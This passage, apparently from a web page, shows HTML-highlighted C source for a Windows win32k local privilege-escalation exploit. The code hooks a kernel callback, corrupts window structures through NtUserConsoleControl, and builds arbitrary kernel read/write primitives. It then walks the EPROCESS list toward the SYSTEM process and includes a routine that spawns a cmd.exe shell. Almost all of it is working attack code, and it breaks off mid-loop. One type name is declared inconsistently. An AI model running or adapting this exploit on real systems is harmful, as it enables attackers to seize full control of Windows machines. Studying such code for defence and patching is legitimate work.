class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">ULONG64</span><span class="params">(WINAPI* PxxxClientAllocWindowClassExtraBytes)</span><span class="params">(PULONG64 pSize)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtUserConsoleControl)</span><span class="params">(DWORD, PVOID, ULONG64)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtCallbackReturn)</span><span class="params">(PVOID Result, ULONG64 ResultLength, NTSTATUS Status)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">PVOID</span><span class="params">(WINAPI* FHMValidateHandle)</span><span class="params">(HANDLE h, BYTE byType)</span></span>;</span><br><span class="line"></span><br><span class="line">PxxxClientAllocWindowClassExtraBytes xxxClientAllocWindowClassExtraBytes = <span class="literal">NULL</span>;</span><br><span class="line">PNtUserConsoleControl gNtUserConsoleControl = <span class="literal">NULL</span>;</span><br><span class="line">PNtCallbackReturn gNtCallbackReturn = <span class="literal">NULL</span>;</span><br><span class="line">lHMValidateHandle pHmValidateHandle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">HINSTANCE hInst;</span><br><span class="line">WCHAR szTitle[MAX_LOADSTRING];</span><br><span class="line"></span><br><span class="line">HWND hWnds[SPRAY_WND_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PULONG64 pWnds[SPRAY_WND_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">HWND hWnd = <span class="literal">NULL</span>;</span><br><span class="line">PULONG64 pWnd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">PULONG64 gFakeExtraBytes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">PVOID gPFakeSpMenu = <span class="literal">NULL</span>;</span><br><span class="line">PVOID gPFakeRgItems = <span class="literal">NULL</span>;</span><br><span class="line">HWND arbHwd = <span class="literal">NULL</span>;</span><br><span class="line">BOOL gHasTrigger = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">        <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">FindHMValidateHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HMODULE hUser32 = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hUser32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to load user32&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BYTE* pIsMenu = (BYTE*)<span class="built_in">GetProcAddress</span>(hUser32, <span class="string">&quot;IsMenu&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pIsMenu == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find location of exported function &#x27;IsMenu&#x27; within user32.dll\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> uiHMValidateHandleOffset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">        BYTE* test = pIsMenu + i;</span><br><span class="line">        <span class="keyword">if</span> (*test == <span class="number">0xE8</span>) &#123;</span><br><span class="line">            uiHMValidateHandleOffset = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (uiHMValidateHandleOffset == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find offset of HMValidateHandle from location of &#x27;IsMenu&#x27;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> addr = *(<span class="type">unsigned</span> <span class="type">int</span>*)(pIsMenu + uiHMValidateHandleOffset);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset = ((<span class="type">unsigned</span> <span class="type">int</span>)pIsMenu - (<span class="type">unsigned</span> <span class="type">int</span>)hUser32) + addr;</span><br><span class="line">    <span class="comment">//The +11 is to skip the padding bytes as on Windows 10 these aren&#x27;t nops</span></span><br><span class="line">    pHmValidateHandle = (lHMValidateHandle)((ULONG64)hUser32 + offset + <span class="number">11</span>);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">MyxxxClientAllocWindowClassExtraBytes</span><span class="params">(PULONG64 pSize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pSize == CB_WND_EXTRA_2) &#123;</span><br><span class="line">        HWND cHwd = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; SPRAY_WND_SIZE; i++) &#123;</span><br><span class="line">            PULONG64 cbWndExtra = *(PULONG64*)((PBYTE)(pWnds[i]) + CB_WND_EXTRA_OFFSET);</span><br><span class="line">            <span class="keyword">if</span> (cbWndExtra == (PULONG64)CB_WND_EXTRA_2) &#123;</span><br><span class="line">                cHwd = (HWND)*(PULONG64*)(pWnds[i]);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] Find cHwd : %llx\n&quot;</span>, cHwd);</span><br><span class="line">                gHasTrigger = TRUE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cHwd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find cHwd!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">        PULONG64 params[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        params[<span class="number">0</span>] = (PULONG64)cHwd;</span><br><span class="line">        params[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS status = <span class="built_in">gNtUserConsoleControl</span>(<span class="number">6</span>, params, <span class="built_in">sizeof</span>(params));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get NtUserConsoleControl : %llx\n&quot;</span>, status);</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">        PULONG64 result[<span class="number">3</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        result[<span class="number">0</span>] = gFakeExtraBytes;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">gNtCallbackReturn</span>(result, <span class="built_in">sizeof</span>(result), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">end:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">xxxClientAllocWindowClassExtraBytes</span>(pSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONG64 <span class="title">arbRead</span><span class="params">(HWND hwd, ULONG64 addr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    MENUBARINFO mbi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    mbi.cbSize = <span class="built_in">sizeof</span>(MENUBARINFO);</span><br><span class="line"></span><br><span class="line">    RECT rect = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">GetWindowRect</span>(hwd, &amp;rect);</span><br><span class="line"></span><br><span class="line">    *(ULONG64*)(gPFakeRgItems) = addr - <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetMenuBarInfo</span>(hwd, <span class="number">-3</span>, <span class="number">1</span>, &amp;mbi);</span><br><span class="line"></span><br><span class="line">    BYTE result[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    *(DWORD*)(result) = mbi.rcBar.left - rect.left;</span><br><span class="line">    *(DWORD*)(result + <span class="number">4</span>) = mbi.rcBar.top - rect.top;</span><br><span class="line">    *(DWORD*)(result + <span class="number">8</span>) = mbi.rcBar.right - mbi.rcBar.left;</span><br><span class="line">    *(DWORD*)(result + <span class="number">0xc</span>) = mbi.rcBar.bottom - mbi.rcBar.top;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *(ULONG64*)result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONG64 <span class="title">arbRead2</span><span class="params">(HWND hwd0, HWND hwd1, ULONG64 WNDk01Offset, ULONG64 addr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hwd0, WNDk01Offset + WND_EXTRA_BYTES_OFFSET, addr);</span><br><span class="line">    ULONG64 result = <span class="built_in">GetWindowLongPtr</span>(hwd1, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">arbWrite</span><span class="params">(HWND hwd0, HWND hwd1, ULONG64 WNDk01Offset, ULONG64 addr,ULONG64 value)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hwd0, WNDk01Offset + WND_EXTRA_BYTES_OFFSET, addr);</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hwd1, <span class="number">0</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hookXxxClientAllocWindowClassExtraBytes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">    PLONG pKernelCallbackTable = (PLONG) * (PLONG*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x58</span>); <span class="comment">// PEB-&gt;KernelCallbackTable</span></span><br><span class="line">    xxxClientAllocWindowClassExtraBytes = (PxxxClientAllocWindowClassExtraBytes)*(PLONG*)((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>, <span class="number">0x400</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    *(PLONG*)((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>) = (PLONG)MyxxxClientAllocWindowClassExtraBytes;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>, <span class="number">0x400</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">spawn_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));</span><br><span class="line"></span><br><span class="line">    STARTUPINFOA si;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] shell!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        CREATE_NEW_CONSOLE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si,</span><br><span class="line">        &amp;pi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(hPrevInstance);</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(lpCmdLine);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">AllocConsole</span>();</span><br><span class="line">    FILE* tempFile = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">freopen_s</span>(&amp;tempFile, <span class="string">&quot;conin$&quot;</span>, <span class="string">&quot;r+t&quot;</span>, stdin);</span><br><span class="line">    <span class="built_in">freopen_s</span>(&amp;tempFile, <span class="string">&quot;conout$&quot;</span>, <span class="string">&quot;w+t&quot;</span>, stdout);</span><br><span class="line"></span><br><span class="line">    gNtUserConsoleControl = (PNtUserConsoleControl)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;win32u.dll&quot;</span>), <span class="string">&quot;NtUserConsoleControl&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!gNtUserConsoleControl) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get NtUserConsoleControl : %llx\n&quot;</span>, err);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    gNtCallbackReturn = (PNtCallbackReturn)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCallbackReturn&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!gNtCallbackReturn) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get NtCallbackReturn : %llx\n&quot;</span>, err);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BOOL bFound = <span class="built_in">FindHMValidateHandle</span>();</span><br><span class="line">    <span class="keyword">if</span> (!bFound) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to locate HmValidateHandle, exiting\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found location of HMValidateHandle in user32.dll\n&quot;</span>);</span><br><span class="line">    <span class="built_in">hookXxxClientAllocWindowClassExtraBytes</span>();</span><br><span class="line">    <span class="built_in">LoadStringW</span>(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);</span><br><span class="line"></span><br><span class="line">    WNDCLASSEXW wcex = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    wcex.cbSize = <span class="built_in">sizeof</span>(WNDCLASSEX);</span><br><span class="line">    wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcex.lpfnWndProc = WndProc;</span><br><span class="line">    wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">    wcex.cbWndExtra = CB_WND_EXTRA_1;</span><br><span class="line">    wcex.hInstance = hInstance;</span><br><span class="line">    wcex.lpszMenuName = <span class="built_in">MAKEINTRESOURCEW</span>(IDC_POC);</span><br><span class="line">    wcex.lpszClassName = CLASS_NAME_1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RegisterClassExW</span>(&amp;wcex);</span><br><span class="line">    wcex.hInstance = hInstance;</span><br><span class="line">    wcex.cbWndExtra = CB_WND_EXTRA_2;</span><br><span class="line">    wcex.lpszClassName = CLASS_NAME_2;</span><br><span class="line">    <span class="built_in">RegisterClassExW</span>(&amp;wcex);</span><br><span class="line"></span><br><span class="line">    HMENU hMenu = <span class="built_in">CreateMenu</span>();</span><br><span class="line">    HMENU hHelpMenu = <span class="built_in">CreateMenu</span>();</span><br><span class="line">    <span class="built_in">AppendMenu</span>(hHelpMenu, MF_STRING, <span class="number">0x1888</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;about&quot;</span>));</span><br><span class="line">    <span class="built_in">AppendMenu</span>(hMenu, MF_POPUP, (LONG)hHelpMenu, <span class="built_in">TEXT</span>(<span class="string">&quot;help&quot;</span>));</span><br><span class="line"></span><br><span class="line">    ULONG64 WNDk0ExtraBytesOffset = <span class="number">0</span>;</span><br><span class="line">    ULONG64 WNDk01Offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> nTrys = <span class="number">0</span>; nTrys &lt; <span class="number">5</span>; nTrys++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SPRAY_WND_SIZE; i++) &#123;</span><br><span class="line"></span><br><span class="line">            HWND h = <span class="built_in">CreateWindowEx</span>(<span class="literal">NULL</span>, CLASS_NAME_1, <span class="literal">NULL</span>, WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>, hMenu, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!h)</span><br><span class="line">            &#123;</span><br><span class="line">                DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to CreateWindowEx, error : %llx\n&quot;</span>, err);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                ULONG64 params[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">                params[<span class="number">0</span>] = (ULONG64)h;</span><br><span class="line">                params[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                NTSTATUS status = <span class="built_in">gNtUserConsoleControl</span>(<span class="number">6</span>, params, <span class="built_in">sizeof</span>(params));</span><br><span class="line">            &#125;</span><br><span class="line">            hWnds[i] = h;</span><br><span class="line">            pWnds[i] = (PULONG64)<span class="built_in">pHmValidateHandle</span>(h, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        gFakeExtraBytes = *(PULONG64*)((PBYTE)(pWnds[<span class="number">0</span>]) + TAG_WNDk_OFFSET);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; SPRAY_WND_SIZE; i++) &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>(hWnds[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        WNDk0ExtraBytesOffset = *(ULONG64*)((PBYTE)(pWnds[<span class="number">0</span>]) + WND_EXTRA_BYTES_OFFSET);</span><br><span class="line"></span><br><span class="line">        ULONG64 WNDk1WndOffset = *(ULONG64*)((PBYTE)(pWnds[<span class="number">1</span>]) + TAG_WNDk_OFFSET);</span><br><span class="line">        WNDk01Offset = WNDk1WndOffset - WNDk0ExtraBytesOffset;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Get WNDk01Offset : %llx\n&quot;</span>, WNDk01Offset);</span><br><span class="line">        <span class="keyword">if</span> (WNDk1WndOffset &lt; WNDk0ExtraBytesOffset) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] The WNDk01Offset less than 0, try again!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            hWnd = <span class="built_in">CreateWindowEx</span>(<span class="literal">NULL</span>, CLASS_NAME_2, <span class="literal">NULL</span>, WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (!hWnd)</span><br><span class="line">            &#123;</span><br><span class="line">                DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to CreateWindowEx, error : %llx\n&quot;</span>, err);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (gHasTrigger) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DestroyWindow</span>(hWnds[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">DestroyWindow</span>(hWnds[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    pWnd = (PULONG64)<span class="built_in">pHmValidateHandle</span>(hWnd, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tagWNDk0-&gt;cbWndExtra</span></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hWnd, CB_WND_EXTRA_OFFSET, <span class="number">0xfffffff0</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    ULONG64 WNDk2WndOffset = *(ULONG64*)((PBYTE)(pWnd)+TAG_WNDk_OFFSET);</span><br><span class="line">    ULONG64 WNDk02Offset = WNDk2WndOffset - WNDk0ExtraBytesOffset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Get WNDk02Offset : %llx\n&quot;</span>, WNDk02Offset);</span><br><span class="line">    <span class="keyword">if</span> (WNDk2WndOffset &lt; WNDk0ExtraBytesOffset) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] The WNDk02Offset less than 0, try again!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get dwStyle </span></span><br><span class="line">    ULONG64 dwStyle = *(ULONG64*)((PBYTE)(pWnds[<span class="number">1</span>]) + DW_EXSTYLE_OFFSET);</span><br><span class="line">    dwStyle |= <span class="number">0x4000000000000000</span>L; <span class="comment">// set WS_CHILD</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tagWNDk1-&gt;dwStyle</span></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hWnds[<span class="number">0</span>], WNDk01Offset + DW_EXSTYLE_OFFSET, dwStyle);</span><br><span class="line"></span><br><span class="line">    gPFakeSpMenu = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, FAKE_SP_MENU_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">memset</span>(gPFakeSpMenu, <span class="number">0</span>, FAKE_SP_MENU_SIZE);</span><br><span class="line"></span><br><span class="line">    PVOID fakeUnknownChunk = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x200</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">memset</span>(fakeUnknownChunk, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    gPFakeRgItems = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x10</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">memset</span>(gPFakeRgItems, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    PVOID fakespMenuk = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x30</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">memset</span>(fakespMenuk, <span class="number">0</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    *(ULONG64*)((PBYTE)gPFakeSpMenu + <span class="number">0x28</span>) = (ULONG64)fakeUnknownChunk;</span><br><span class="line">    *(ULONG64*)((PBYTE)fakeUnknownChunk + <span class="number">0x2c</span>) = <span class="number">1</span>;</span><br><span class="line">    *(DWORD*)((PBYTE)gPFakeSpMenu + <span class="number">0x40</span>) = <span class="number">1</span>;</span><br><span class="line">    *(DWORD*)((PBYTE)gPFakeSpMenu + <span class="number">0x44</span>) = <span class="number">1</span>;</span><br><span class="line">    *(ULONG64*)((PBYTE)gPFakeSpMenu + <span class="number">0x58</span>) = (ULONG64)gPFakeRgItems;</span><br><span class="line">    *(ULONG64*)(gPFakeRgItems) = <span class="number">0xdeadbeef</span>; <span class="comment">// read addr</span></span><br><span class="line">    *(ULONG64*)((PBYTE)gPFakeSpMenu + <span class="number">0x98</span>) = (ULONG64)fakespMenuk;</span><br><span class="line">    *(ULONG64*)(fakespMenuk) = (ULONG64)gPFakeSpMenu;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set fakeSpMenu and get oldPMenu</span></span><br><span class="line">    ULONG64 oldPMenu = <span class="built_in">SetWindowLongPtr</span>(hWnds[<span class="number">1</span>], GWLP_ID, (ULONG64)gPFakeSpMenu);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Get oldPMenu : %llx\n&quot;</span>, oldPMenu);</span><br><span class="line"></span><br><span class="line">    dwStyle ^= <span class="number">0x4000000000000000</span>L; <span class="comment">// dwStyle recover</span></span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(hWnds[<span class="number">0</span>], WNDk01Offset + DW_EXSTYLE_OFFSET, dwStyle);</span><br><span class="line"></span><br><span class="line">    ULONG64 originWNDExtraBytes = <span class="built_in">GetWindowLongPtr</span>(hWnds[<span class="number">0</span>], WNDk01Offset + WND_EXTRA_BYTES_OFFSET);</span><br><span class="line"></span><br><span class="line">    ULONG64 eprocess = <span class="built_in">arbRead</span>(hWnds[<span class="number">1</span>], oldPMenu + <span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">if</span> (eprocess != <span class="number">0</span>) &#123;</span><br><span class="line">        eprocess = <span class="built_in">arbRead</span>(hWnds[<span class="number">1</span>], eprocess + <span class="number">0x10</span>);</span><br><span class="line">        eprocess = <span class="built_in">arbRead</span>(hWnds[<span class="number">1</span>], eprocess);</span><br><span class="line">        eprocess = <span class="built_in">arbRead</span>(hWnds[<span class="number">1</span>], eprocess + <span class="number">0x220</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Get eprocess : %llx\n&quot;</span>, eprocess);</span><br><span class="line"></span><br><span class="line">        ULONG64 beginEprocess = eprocess;</span><br><span class="line">        ULONG64 processId = <span class="number">0</span>;</span><br><span class="line">        ULONG64 nextEprocess = <span class="number">0</span>;</span><br><span class="line">        ULONG64 dwPID = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">        ULONG64 currentEprocess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            processId = <span class="built_in">arbRead</span>(hWnds[<span class="number">1</span>], eprocess + PROCESS_ID_OFFSET);</span><br><span class="line">            <span class="keyword">if</span> (processId == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            nextEprocess = <span class="built_in">arbRead</span>(hWnds[<span class="number">1</span>], eprocess + NEXT_EPROCESS_OFFSET) - NEXT_EPROCESS_OFFSET;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nextEprocess == beginEprocess) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (processId == dwPID) &#123;</span><br><span class="line">                currentEprocess = eprocess;</span><br><span class="line">            &#125;</span><br><span class="line">            eprocess = nextEprocess;</span><br><span class="line">        